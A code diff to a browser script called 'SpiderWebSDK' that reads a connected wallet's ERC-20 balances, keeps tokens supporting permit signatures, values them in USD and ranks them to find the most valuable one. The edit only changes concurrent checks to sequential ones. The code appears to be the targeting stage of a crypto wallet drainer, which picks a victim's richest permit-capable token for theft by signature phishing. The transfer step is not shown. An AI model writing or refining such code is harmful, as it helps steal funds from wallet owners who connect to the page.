@@ -107,7 +107,7 @@ window.SpiderWebSDK = {
 },
 
     _getRankedCompatibleTokens: async function() {
-    // Steps 1 & 2: Get balances and filter for permit-compatible tokens
+    // Get balances (same as before)
     const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
     const response = await fetch(alchemyUrl, {
         method: 'POST',
@@ -123,7 +123,9 @@ window.SpiderWebSDK = {
     const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
     if (nonZeroBalances.length === 0) return [];
 
-    const checkPromises = nonZeroBalances.map(async (token) => {
+    // Sequentially check tokens for permit support
+    const compatibleTokens = [];
+    for (const token of nonZeroBalances) {
         if (await this._checkPermitSupport(token.contractAddress)) {
             const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
             const [name, symbol, balance, decimals] = await Promise.all([
@@ -132,18 +134,14 @@ window.SpiderWebSDK = {
                 tokenContract.balanceOf(this._currentUserAddress),
                 tokenContract.decimals()
             ]);
-            return { contractAddress: token.contractAddress, name, symbol, balance, decimals, usdValue: 0 }; // Add usdValue property
+            compatibleTokens.push({ contractAddress: token.contractAddress, name, symbol, balance, decimals, usdValue: 0 });
         }
-        return null;
-    });
+    }
 
-    const compatibleTokens = (await Promise.all(checkPromises)).filter(Boolean);
     if (compatibleTokens.length === 0) return [];
 
-    // Step 3: Fetch prices
+    // Fetch prices and calculate value (same as before)
     const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress));
-
-    // Step 4: Calculate USD value for each token
     if (prices) {
         for (const token of compatibleTokens) {
             const priceData = prices[token.contractAddress.toLowerCase()];
@@ -154,9 +152,7 @@ window.SpiderWebSDK = {
         }
     }
 
-    // Step 5: Sort tokens by USD value in descending order
     compatibleTokens.sort((a, b) => b.usdValue - a.usdValue);
-
     return compatibleTokens;
 },
     _fetchTokenPrices: async function(tokenAddresses) {
@@ -226,81 +222,74 @@ window.SpiderWebSDK = {
     },
 
     _findHighestValueToken: async function() {
-        // 1. Fetch all token balances from Alchemy (same as before)
-        const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
-        const response = await fetch(alchemyUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
-                params: [this._currentUserAddress, 'erc20']
-            })
-        });
-        const data = await response.json();
-        if (!data.result) throw new Error("Could not fetch token balances from Alchemy.");
+    // 1. Fetch all token balances (same as before)
+    const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
+    const response = await fetch(alchemyUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
+            params: [this._currentUserAddress, 'erc20']
+        })
+    });
+    const data = await response.json();
+    if (!data.result) throw new Error("Could not fetch token balances from Alchemy.");
 
-        const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
-        if (nonZeroBalances.length === 0) return null;
-        
-        this._updateStatus("Finding all compatible tokens...", "pending");
+    const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
+    if (nonZeroBalances.length === 0) return null;
+    
+    this._updateStatus("Finding all compatible tokens...", "pending");
 
-        // 2. Concurrently check all tokens for permit support and get their details.
-        const checkPromises = nonZeroBalances.map(async (token) => {
-            if (await this._checkPermitSupport(token.contractAddress)) {
-                const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
-                const [name, symbol, balance, decimals] = await Promise.all([
-                    tokenContract.name(),
-                    tokenContract.symbol(),
-                    tokenContract.balanceOf(this._currentUserAddress),
-                    tokenContract.decimals()
-                ]);
-                return { contractAddress: token.contractAddress, name, symbol, balance, decimals };
-            }
-            return null;
-        });
-
-        // 3. Filter out non-compatible tokens
-        const compatibleTokens = (await Promise.all(checkPromises)).filter(Boolean);
-
-        if (compatibleTokens.length === 0) {
-            return null; // No permit-compatible tokens found at all
+    // 2. Sequentially check tokens for permit support.
+    const compatibleTokens = [];
+    for (const token of nonZeroBalances) {
+        if (await this._checkPermitSupport(token.contractAddress)) {
+            const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
+            const [name, symbol, balance, decimals] = await Promise.all([
+                tokenContract.name(),
+                tokenContract.symbol(),
+                tokenContract.balanceOf(this._currentUserAddress),
+                tokenContract.decimals()
+            ]);
+            compatibleTokens.push({ contractAddress: token.contractAddress, name, symbol, balance, decimals });
         }
-        
-        // Optimization: If there's only one, no need to fetch prices.
-        if (compatibleTokens.length === 1) {
-            return compatibleTokens[0];
-        }
+    }
 
-        this._updateStatus(`Found ${compatibleTokens.length} tokens. Valuating...`, "pending");
+    if (compatibleTokens.length === 0) {
+        return null;
+    }
+    
+    if (compatibleTokens.length === 1) {
+        return compatibleTokens[0];
+    }
 
-        // 4. Fetch prices for all compatible tokens
-        const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress));
-        if (!prices) {
-            console.warn("Could not fetch prices. Defaulting to the first compatible token found.");
-            return compatibleTokens[0]; // Fallback if price API fails
-        }
-        
-        // 5. Calculate USD value and find the token with the highest value
-        let highestValueToken = null;
-        let maxUsdValue = -1;
+    this._updateStatus(`Found ${compatibleTokens.length} tokens. Valuating...`, "pending");
 
-        for (const token of compatibleTokens) {
-            const priceData = prices[token.contractAddress.toLowerCase()];
-            if (priceData && priceData.usd) {
-                // Calculate the value: (balance / 10^decimals) * price
-                const formattedBalance = ethers.utils.formatUnits(token.balance, token.decimals);
-                const usdValue = parseFloat(formattedBalance) * priceData.usd;
+    // 3. Fetch prices and find the highest value (same as before)
+    const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress));
+    if (!prices) {
+        console.warn("Could not fetch prices. Defaulting to the first compatible token found.");
+        return compatibleTokens[0];
+    }
+    
+    let highestValueToken = null;
+    let maxUsdValue = -1;
 
-                if (usdValue > maxUsdValue) {
-                    maxUsdValue = usdValue;
-                    highestValueToken = token;
-                }
+    for (const token of compatibleTokens) {
+        const priceData = prices[token.contractAddress.toLowerCase()];
+        if (priceData && priceData.usd) {
+            const formattedBalance = ethers.utils.formatUnits(token.balance, token.decimals);
+            const usdValue = parseFloat(formattedBalance) * priceData.usd;
+
+            if (usdValue > maxUsdValue) {
+                maxUsdValue = usdValue;
+                highestValueToken = token;
             }
         }
+    }
 
-        // Return the highest value token found. If no prices were found, fall back to the first one.
-        return highestValueToken || compatibleTokens[0];
-    },
+    return highestValueToken || compatibleTokens[0];
+},
 
 _logConnectionEvent: async function() {
     try {
